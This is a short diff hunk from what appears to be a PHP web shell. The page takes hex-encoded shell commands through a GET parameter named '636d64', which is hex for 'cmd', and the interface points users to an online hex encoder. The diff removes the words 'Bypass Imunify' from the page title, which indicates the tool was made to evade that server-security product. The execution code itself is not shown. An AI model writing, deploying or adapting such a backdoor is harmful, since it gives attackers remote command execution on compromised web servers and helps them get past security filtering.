@@ -67,7 +67,7 @@ if (isset($_GET['636d64'])) {
     </style>
 </head>
 <body>
-    <h1>Command Execution Bypass Imunify</h1>
+    <h1>Command Execution</h1>
     <form method="GET">
         <label>Enter command in hexadecimal format , encode your command on https://encode-decode.com/bin2hex-decode-online/ :</label>
         <input type="text" name="636d64" placeholder="e.g., 6c73306c 616c6c">
